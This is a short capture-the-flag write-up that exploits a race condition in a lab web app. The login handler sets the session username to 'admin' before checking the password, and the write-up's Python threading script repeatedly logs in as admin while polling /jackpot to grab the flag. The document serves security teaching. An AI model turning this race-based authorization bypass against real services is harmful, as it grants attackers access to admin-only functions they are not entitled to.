# Challenge `Another Jackpot` Writeup

- Vulnerability:
    - Time-of-check / Time-of - Race Condition

- Where:
    - `/login` and `/jackpot` endpoints

- Impact:
    - Allows non-admin users to access admin-only endpoints

## Steps to reproduce

By looking at the source code of the server, we can see that the jackpot page only reveals the flag when the `current_session.username == 'admin'`. 
Additionally, it's  revealed that during the login process, the variable current_session.username is set to the field username of the request form, momentarily allowing us to login as admin.

```python
current_session = get_current_session()
current_session.username = username
db.session.commit()
```

### Step 1: Login as admin

Since the variable `current_session.username` is set without any kind of verification, we can send a request to the `/login` endpoint with the username field set to `admin` and the password field set to anything (not empty).

```python
def login_as_admin():
    s.post(link + "/login", data={"username": "admin", "password": "passwordNotEmpty"})
```

### Step 2: Request the jackpot page

Using threads, we parallely send a request to the `/jackpot` endpoint and hope that the `current_session.username` variable is still set to `'admin'`, allowing us to see the flag.

```python
def login():
    while not success:
        login_as_admin()

login = threading.Thread(target=login)
login.start()

while not success:
    r = s.get(link + "/jackpot")
    match = re.search(r"SSof{.*}", r.text)
    if match:
        print(match.group(0))
        success = True
        login.join()
```

## Implementation

The full implementation can be found [here](another_jackpot.py).
